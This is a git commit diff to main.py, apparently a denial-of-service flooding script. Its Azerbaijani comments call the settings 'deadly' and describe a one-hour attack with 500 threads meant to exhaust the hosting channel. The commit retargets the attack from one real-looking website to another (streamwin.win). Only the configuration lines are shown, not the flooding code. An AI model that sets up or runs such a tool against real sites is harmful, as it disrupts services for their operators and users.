cd758f9a3a891f7d956b04d844f7a493d2d706ff
agayevv7 <109365950+agayevv7@users.noreply.github.com>
2026-05-07 18:33:45 +0400

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ import string
 
 # --- ÖLÜMCÜL AYARLAR ---
 # Saytın portu (HTTPS üçün 443, HTTP üçün 80)
-TARGET_HOST = "https://www.appl88-vip.com"
+TARGET_HOST = "https://streamwin.win"
 TARGET_PORT = 443
 THREADS = 500 # Railway-in internet kanalını sona qədər istifadə edir
 DURATION = 3600 # 1 Saatlıq hücum
